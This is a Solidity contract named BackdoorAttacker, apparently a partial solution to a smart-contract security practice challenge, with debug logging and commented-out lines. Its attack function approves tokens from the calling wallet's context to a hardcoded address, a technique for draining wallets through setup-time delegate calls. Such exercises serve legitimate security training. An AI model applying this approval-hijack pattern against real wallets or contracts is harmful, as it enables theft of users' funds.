pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";

contract BackdoorAttacker {
    using Address for address;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18

    IERC20 private immutable token;
    address private attacker;

    constructor(address attackerAddress, address tokenAddress) {
        console.log("Constructor %s", attackerAddress);
        attacker = attackerAddress;
        token = IERC20(tokenAddress);
    }

    function attack() external {
        // console.log("ATTACK!");
        // console.log(msg.sender);
        console.log("Attack, this %s", address(this));
        console.log("Attack, attacker %s", attacker);
        // console.log("");
        token.approve(0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc, TOKEN_PAYMENT);
    }

    fallback() external {
        console.log("fallback sender %s", msg.sender);
        console.log("fallback this %s", address(this));
        console.log(token.balanceOf(msg.sender));
        console.log(token.balanceOf(address(this)));
        // token.transfer(attacker, TOKEN_PAYMENT);
    }
}
